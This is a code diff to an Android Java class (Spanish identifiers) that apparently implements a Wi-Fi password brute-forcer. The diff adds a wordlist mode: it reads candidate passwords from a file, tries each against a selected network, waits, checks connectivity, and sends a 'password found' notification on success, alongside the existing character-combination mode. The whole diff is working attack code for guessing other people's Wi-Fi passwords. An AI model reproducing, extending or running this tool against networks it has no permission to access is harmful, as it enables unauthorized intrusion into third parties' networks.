@@ -13,6 +13,11 @@ import android.view.LayoutInflater;
 import android.view.View;
 import android.widget.TextView;
 
+import java.io.BufferedReader;
+import java.io.FileReader;
+import java.io.IOException;
+import java.util.ArrayList;
+
 /**
  * Created by Gamer on 03/01/2018.
  */
@@ -23,17 +28,20 @@ public class Passwords extends DialogFragment {
     private View view;
     private TextView Tv_Pass;
     private WifiController Wifi;
-    char[] Elem;
+    private String Elem;
     private boolean Leer_Archivo;
     private NotificationCompat.Builder Notificacion;
     private NotificationManager NotiM;
+    private int Tamaño;
     private Tarea Tarea = new Tarea();
+    private ArrayList<String> Contraseñas = new ArrayList<>();
 
     @SuppressLint("ValidFragment")
-    public Passwords(String Elem, boolean Leer_Archivo) {
-        this.Wifi = Inicio.getWifi();
-        this.Elem = Elem.toCharArray();
+    public Passwords(String Elem, boolean Leer_Archivo, int Tamaño, WifiController Wifi) {
+        this.Wifi = Wifi;
+        this.Elem = Elem;
         this.Leer_Archivo = Leer_Archivo;
+        this.Tamaño = Tamaño;
     }
 
     @Override
@@ -49,6 +57,7 @@ public class Passwords extends DialogFragment {
             @Override
             public void onClick(View v) {
                 Tarea.cancel(true);
+                Wifi.EnableNetwork();
             }
         });
         builder.setView(view)
@@ -64,9 +73,17 @@ public class Passwords extends DialogFragment {
         protected Void doInBackground(Void... voids) {
             Wifi.DisableNetwork();
             if (Leer_Archivo) {
-
+                try {Cargar_Archivo(Elem.toString());} catch (IOException e) {}
+                if(Contraseñas.isEmpty()){
+                    publishProgress("Error No Hay Contenido En El Archivo");
+                    try {Thread.sleep(2500);} catch (InterruptedException e) {}
+                    dismiss();
+                    return null;
+                }else{
+                    Contraseña_Archivo();
+                }
             } else {
-                WordList(Elem, "", Elem.length);
+                WordList(Elem.toCharArray(), "", Tamaño);
             }
             return null;
         }
@@ -96,24 +113,28 @@ public class Passwords extends DialogFragment {
         private void WordList(char[] elem, final String act, int Tamaño) {
             if(isCancelled()) return;
             if (Tamaño == 0) {
-                publishProgress(act);
-                Notificacion(act, 001, "Probando", "Probando Contraseñas", R.drawable.notificacion, null);
-                Wifi.Connect(act, Wifi.WifiInfo.get(Wifi.Position).getsNombre());
-                Wifi.Reconnect();
-                try {Thread.sleep(15000);} catch (InterruptedException e) {}
-                if (Wifi.isOnline()) {
-                    Wifi.Remove();
-                    try {
-                        Notificacion(act, 002, "Encontrado!", "Contraseña Encontrada", R.drawable.open, new long[] {100, 250, 100, 500});
-                        onCancelled();
-                    } catch (Throwable throwable) {
-                        throwable.printStackTrace();
-                    }
-                }
+                Connect(act);
             } else {
                 for (int i = 0; i < elem.length; i++) {
                     if(isCancelled()) break;
                     WordList(elem, act + elem[i], Tamaño - 1);
+                }
+            }
+        }
+        private void Connect(String Contra){
+            publishProgress(Contra);
+            Notificacion(Contra, 001, "Probando", "Probando Contraseñas", R.drawable.notificacion, null);
+            Wifi.Connect(Contra, Wifi.WifiInfo.get(Wifi.Position).getsNombre());
+            Wifi.Reconnect();
+            try {Thread.sleep(15000);} catch (InterruptedException e) {}
+            if (Wifi.isOnline()) {
+                Wifi.Remove();
+                try {
+                    Wifi.EnableNetwork();
+                    Notificacion(Contra, 002, "Encontrado!", "Contraseña Encontrada", R.drawable.open, new long[] {100, 250, 100, 500});
+                    onCancelled();
+                } catch (Throwable throwable) {
+                    throwable.printStackTrace();
                 }
             }
         }
@@ -126,6 +147,22 @@ public class Passwords extends DialogFragment {
                     .setVibrate(Vibrate)
                     .setContentTitle(Title);
             NotiM.notify(Id, Notificacion.build());
+        }
+        private void Cargar_Archivo(String Ruta) throws IOException {
+            publishProgress("Cargando Archivo...");
+            try {Thread.sleep(1500);} catch (InterruptedException e) {}
+            String cadena;
+            FileReader f = new FileReader(Ruta);
+            BufferedReader b = new BufferedReader(f);
+            while((cadena = b.readLine())!=null) {
+                Contraseñas.add(cadena);
+            }
+        }
+        private void Contraseña_Archivo(){
+            for (String Contraseña : Contraseñas){
+                if(isCancelled()) return;
+                Connect(Contraseña);
+            }
         }
     }
 
